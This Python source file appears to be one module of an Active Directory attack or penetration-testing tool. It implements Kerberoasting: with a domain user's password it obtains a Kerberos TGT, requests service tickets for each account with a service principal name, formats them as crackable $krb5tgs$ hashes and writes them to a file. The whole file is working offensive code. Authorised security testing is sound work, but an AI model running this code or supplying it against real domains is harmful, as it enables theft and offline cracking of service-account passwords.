import json
from ldap3 import Server, Connection, ALL, ALL_ATTRIBUTES, LEVEL, SUBTREE, ALL_OPERATIONAL_ATTRIBUTES
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from binascii import hexlify
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.krb5.asn1 import TGS_REP
from termcolor import colored
from . .utils.utils import Utils


class Kerberoasting():


    def __init__(self, server, domuser, passwd, spn):
        self.server = server
        self.domuser = domuser
        self.passwd = passwd
        self.spn = spn
        self.utils = Utils()
        self.enumSPNUsers()


    def enumSPNUsers(self):
            users_spn = {
            }
            user_tickets = {
            }

            userDomain = self.domuser.split('@')[1]

            idx = 0
            for entry in self.spn:
                spn = json.loads(self.spn[idx].entry_to_json())
                users_spn[self.utils.splitJsonArr(spn['attributes'].get('name'))] = self.utils.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
                idx += 1    

            # Get TGT for the supplied user
            client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            try:
                # We need to take the domain from the user@domain since it *could* be a cross-domain user
                tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=None)

                TGT = {}
                TGT['KDC_REP'] = tgt
                TGT['cipher'] = cipher
                TGT['sessionKey'] = newSession
        
                for user, spns in users_spn.items():
                    if isinstance(spns, list):
                        # We only really need one to get a ticket
                        spn = spns[0]
                    else:
                        spn = spns
                        try:
                            # Get the TGS
                            serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                            tgs, cipher, oldSession, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
                            # Decode the TGS
                            decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                            # Get different encryption types
                            if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
                                entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
                                user_tickets[spn] = entry
                            elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
                                entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
                                user_tickets[spn] = entry
                            elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
                                entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
                                user_tickets[spn] = entry
                            elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
                                entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
                                user_tickets[spn] = entry

                        except KerberosError:
                            # For now continue
                            # TODO: Maybe look deeper into issue here
                            continue

                if len(user_tickets.keys()) > 0:
                    with open('{0}-spn-tickets'.format(self.server), 'w') as f:
                        for key, value in user_tickets.items():
                            f.write('{0}:{1}\n'.format(key, value))
                    if len(user_tickets.keys()) == 1:
                        print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting'.format(len(user_tickets.keys())))
                    else:
                        print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
                else:
                    print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))


            except KerberosError as err:
                print('[ ' + colored('ERROR', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
                pass